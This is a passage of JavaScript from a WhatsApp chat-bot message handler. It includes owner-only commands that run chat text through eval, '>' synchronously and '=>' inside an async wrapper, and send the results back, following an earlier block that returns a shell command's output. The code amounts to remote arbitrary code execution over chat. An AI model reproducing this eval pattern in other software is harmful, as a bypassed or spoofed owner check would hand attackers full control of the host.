if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('>')){
if (!dev.key.fromMe && !isOwner) return
try {
return xdev.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: dev})
} catch(err) {
e = String(err)
reply(e)
}
}

if (budy.startsWith('=>')){
if (!isOwner && !dev.key.fromMe) return
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}

	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'aqua'), `${fake}`, color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}


	
    
